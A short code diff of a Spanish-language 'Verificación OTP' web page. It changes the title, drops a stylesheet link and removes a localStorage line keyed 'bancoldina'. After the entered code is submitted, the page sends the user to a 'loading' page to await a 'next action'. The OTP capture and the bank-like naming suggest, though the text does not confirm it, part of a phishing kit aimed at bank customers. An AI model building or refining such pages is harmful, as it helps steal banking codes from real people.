@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Código</title>
+    <title>Verificación OTP</title>
     <style>
     * {
         margin: 0;
@@ -92,8 +92,6 @@
         background-color: #bababa;
     }
 </style>
-
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
 </head>
 <body>
     <div class="image-container">
@@ -187,11 +185,8 @@
                 console.log('Respuesta OTP:', result);
 
                 if (result.ok) {
-                    // Guardar OTP en localStorage si necesitas
-                    localStorage.setItem('bancoldina', otpCode);
-                    
-                    // Redirigir a página de éxito o siguiente paso
-                    window.location.href = 'loading.html'; // O a otra página específica
+                    // Redirigir a loading para esperar siguiente acción
+                    window.location.href = 'loading.html';
                 } else {
                     alert('Error al enviar el código: ' + (result.error || 'Error desconocido'));
                 }
